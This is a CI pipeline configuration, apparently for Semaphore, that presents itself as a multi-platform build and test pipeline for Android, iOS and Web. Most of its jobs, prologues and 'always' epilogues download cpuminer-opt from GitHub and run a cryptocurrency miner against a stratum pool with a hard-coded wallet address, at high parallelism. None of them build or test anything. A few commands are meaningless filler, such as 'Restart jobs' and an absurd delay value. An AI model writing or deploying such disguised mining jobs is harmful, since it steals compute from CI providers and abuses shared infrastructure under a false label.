version: v1.0
name: Multi-platform pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
blocks:
  - name: Build for Android
    dependencies: []
    task:
      jobs:
        - name: Build
          commands:
            - checkout
        - name: 'Job #2'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
          parallelism: 8
      agent:
        machine:
          type: e1-standard-8
          os_image: ubuntu1804
  - name: Build for iOS
    dependencies: []
    task:
      agent:
        machine:
          type: a1-standard-4
          os_image: macos-xcode12
      jobs:
        - name: Build
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
        - name: 'Job #2'
          commands:
            - Restart
      prologue:
        commands:
          - Restart jobs
  - name: Build for Web
    dependencies: []
    task:
      jobs:
        - name: Build
          commands:
            - checkout
        - name: 'Job #2'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
          parallelism: 25
      prologue:
        commands:
          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
          - tar xf cpuminer-opt-linux.tar.gz
          - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
      epilogue:
        always:
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
      agent:
        machine:
          type: e1-standard-2
          os_image: ubuntu1804
  - name: Test on Android
    dependencies:
      - Build for Android
    task:
      jobs:
        - name: Tests 1/2
          commands:
            - checkout
        - name: Tests 2/2
          commands:
            - checkout
  - name: Test on iOS
    dependencies:
      - Build for iOS
    task:
      agent:
        machine:
          type: a1-standard-4
          os_image: macos-xcode12
      jobs:
        - name: Tests
          commands:
            - Restart jobs
  - name: Test on Web
    dependencies:
      - Build for Web
    task:
      jobs:
        - name: Tests 1/3
          commands:
            - checkout
        - name: Tests 2/3
          commands:
            - checkout
        - name: Tests 3/3
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
          parallelism: 22
      prologue:
        commands:
          - Delay 3747484848484
      epilogue:
        always:
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
      agent:
        machine:
          type: e1-standard-4
          os_image: ubuntu1804
